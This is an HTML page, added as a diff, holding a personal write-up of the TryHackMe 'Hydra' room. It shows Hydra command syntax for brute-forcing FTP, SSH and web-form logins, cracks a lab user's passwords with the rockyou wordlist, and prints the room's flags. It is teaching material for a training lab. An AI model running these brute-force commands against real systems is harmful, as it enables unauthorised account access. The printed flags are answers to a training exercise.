@@ -1,0 +1,198 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>TryHackMe Hydra | frncscrlnd’s writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="TryHackMe Hydra" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Walkthrough/Writeup of a TryHackMe room about Hydra, a password bute-force and username enumeration tool." />
+<meta property="og:description" content="Walkthrough/Writeup of a TryHackMe room about Hydra, a password bute-force and username enumeration tool." />
+<link rel="canonical" href="http://localhost:4000/tryhackme/Hydra/" />
+<meta property="og:url" content="http://localhost:4000/tryhackme/Hydra/" />
+<meta property="og:site_name" content="frncscrlnd’s writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="TryHackMe Hydra" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Walkthrough/Writeup of a TryHackMe room about Hydra, a password bute-force and username enumeration tool.","headline":"TryHackMe Hydra","url":"http://localhost:4000/tryhackme/Hydra/"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=150d28b77225a4a207f11ff76d8d5a1e96152911">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <!--[if lt IE 8]>
+    <link rel="stylesheet" href="/assets/css/ie.css">
+    <![endif]-->
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          displayMath: [['$$', '$$'], ['\\[', '\\]']]
+        },
+        svg: { fontCache: 'global' }
+      };
+    </script>
+    <script id="MathJax-script" async
+            src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+    </script>
+  </head>
+  <body>
+    <div class="wrapper">
+      <section>
+        <div id="title">
+          <h1>frncscrlnd's writeups</h1>
+          <p>Writeups from challenges and CTFs i take part in.</p>
+          <hr>
+          <span class="credits left">Project maintained by <a href="https://github.com/frncscrlnd">frncscrlnd</a></span>
+          <span class="credits right">Hosted on GitHub Pages &mdash; Theme by <a href="https://twitter.com/mattgraham">mattgraham</a></span>
+        </div>
+
+        <h1 id="hydra"><a href="https://tryhackme.com/room/hydra">Hydra</a><!-- omit in toc --></h1>
+
+<p>This room will walk us through the process of learning how to use <a href="https://www.kali.org/tools/hydra/">hydra</a>, a password brute-force tool included in <a href="https://www.kali.org/">Kali linux</a>. Hydra can be used both for <a href="https://en.wikipedia.org/wiki/Password_cracking">password guessing</a> and <a href="https://en.wikipedia.org/wiki/Brute-force_attack">brute-force</a>. In this room we’ll learn about hydra’s password guessing mode.</p>
+
+<h3 id="table-of-contents">Table of contents:</h3>
+<ul>
+  <li><a href="#hydra-introduction">Hydra introduction</a></li>
+  <li><a href="#using-hydra">Using Hydra</a></li>
+</ul>
+
+<h2 id="hydra-introduction">Hydra introduction</h2>
+
+<p>This part only tells us about which authentication modes are supported by hydra. You can learn more <a href="https://www.kali.org/tools/hydra/#:~:text=Supported%20services">here</a>.</p>
+
+<h2 id="using-hydra">Using Hydra</h2>
+
+<p>Now the actual content of the room: how to install and use hydra. As the room tells us, you can install hydra a on an Ubuntu or Fedora system by executing apt install hydra or dnf install hydra. Furthermore, you can download it from its <a href="https://github.com/vanhauser-thc/thc-hydra">official repository</a> (opens in new tab).</p>
+
+<p>But how do you use it? Well, first, there’s different options for different protocols:</p>
+
+<p><strong>FTP</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l &lt;username&gt; -P &lt;wordlist&gt; &lt;target_IP&gt; -t 4 ftp
+</code></pre></div></div>
+<p>or</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l &lt;username&gt; -P &lt;wordlist&gt; ftp://&lt;target&gt; -t 4
+</code></pre></div></div>
+
+<p><strong>SSH</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l &lt;username&gt; -P &lt;wordlist&gt; &lt;target_IP&gt; -t 4 ssh
+</code></pre></div></div>
+<p>or</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l &lt;username&gt; -P &lt;wordlist&gt; ssh://&lt;target&gt; -t 4
+</code></pre></div></div>
+
+<p><strong>Web authentication</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l &lt;username&gt; -P &lt;wordlist&gt; &lt;target_IP&gt; http-post-form "&lt;endpoint&gt;:&lt;username_param&gt;=^USER^&amp;&lt;passwd_param&gt;=^PASS^:&lt;error_message&gt;"
+</code></pre></div></div>
+
+<p>Using the <code class="language-plaintext highlighter-rouge">-l</code> flag means that we are going to use a specifica username to authenticate. <code class="language-plaintext highlighter-rouge">-L</code>, however, means that we are using a wordlist as the list of possible usernames. The same goes for <code class="language-plaintext highlighter-rouge">-p</code> and <code class="language-plaintext highlighter-rouge">-P</code> with passwords. We can also use wordlists to guess usernames AND passwords with <code class="language-plaintext highlighter-rouge">-L</code> and <code class="language-plaintext highlighter-rouge">-P</code>.</p>
+
+<p>We can, in fact, use this method to enumerate usernames:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -L &lt;wordlist&gt; -p test &lt;target_IP&gt; http-post-form "&lt;endpoint&gt;:&lt;username_param&gt;=^USER^&amp;&lt;passwd_param&gt;=^PWD^:&lt;error_message&gt;"
+</code></pre></div></div>
+
+<p>And the <code class="language-plaintext highlighter-rouge">&lt;error_message&gt;</code> part will just be whatever error pops up when you fail to authenticate. Let’s see how this works with an example:</p>
+
+<p>After pasting the machine’s IP address into our browser’s address bar, we can see this login form:</p>
+
+<p><img src="/assets/images/thm/hydra/login.png" alt="login" /></p>
+
+<p>Afet trying to login we can see:</p>
+
+<p><img src="/assets/images/thm/hydra/fail.png" alt="fail" /></p>
+
+<p>This means that <code class="language-plaintext highlighter-rouge">Your username or password is incorrect.</code> will be our <code class="language-plaintext highlighter-rouge">&lt;error_message&gt;</code> for the first task, which will be guessing <code class="language-plaintext highlighter-rouge">molly</code>’s password:</p>
+
+<p><code class="language-plaintext highlighter-rouge">Use Hydra to brute-force molly's web password. What is the value of flag 1?</code></p>
+
+<p>We’ll use the mode we saw before, <code class="language-plaintext highlighter-rouge">molly</code> as the username, and <code class="language-plaintext highlighter-rouge">rockyou.txt</code> as the password wordlist (as the hint tells us, <code class="language-plaintext highlighter-rouge">If you've tried more than 30 passwords from RockYou.txt, you are doing something wrong!</code>):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l molly -P /usr/share/wordlists/rockyou.txt &lt;machine_IP&gt; http-post-form "/login:username=^USER^&amp;password=^PASS^:incorrect"
+</code></pre></div></div>
+
+<p>We’ll see:</p>
+
+<p><img src="/assets/images/thm/hydra/sunshine.png" alt="sunshine" /></p>
+
+<p>This means that <code class="language-plaintext highlighter-rouge">molly</code>’s password is <code class="language-plaintext highlighter-rouge">sunshine</code>. Our flag will be:</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">THM{2673a7dd116de68e85c48ec0b1f2612e}</code></p>
+</blockquote>
+
+<p>Now for the second task:</p>
+
+<p><code class="language-plaintext highlighter-rouge">Use Hydra to brute-force molly's SSH password. What is the value of flag 2?</code></p>
+
+<p>We’ll use the SSH hydra syntax, <code class="language-plaintext highlighter-rouge">molly</code> as the username and <code class="language-plaintext highlighter-rouge">rockyou.txt</code> as the wordlist:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://&lt;target_IP&gt; 
+</code></pre></div></div>
+
+<p>or</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l molly -P /usr/share/wordlists/rockyou.txt &lt;target_IP&gt; ssh
+</code></pre></div></div>
+
+<p>We’ll se something like:</p>
+
+<p><img src="/assets/images/thm/hydra/butterfly.png" alt="butterfly" /></p>
+
+<p>This means that <code class="language-plaintext highlighter-rouge">molly</code>’s SSH password is <code class="language-plaintext highlighter-rouge">butterfly</code>. we can now login with:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh molly@&lt;target_IP&gt;
+</code></pre></div></div>
+
+<p>we’ll see something like this. Just type <code class="language-plaintext highlighter-rouge">yes</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</code></pre></div></div>
+
+<p>Type in the password when prompted:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>molly@&lt;target_IP&gt;'s password: 
+</code></pre></div></div>
+
+<p>then run the <code class="language-plaintext highlighter-rouge">ls</code> commnd to list files. We’ll see <code class="language-plaintext highlighter-rouge">flag2.txt</code>. Use <code class="language-plaintext highlighter-rouge">cat flag2.txt</code> to read it:</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">THM{c8eeb0468febbadea859baeb33b2541b}</code></p>
+</blockquote>
+
+
+      </section>
+
+    </div>
+  </body>
+</html>
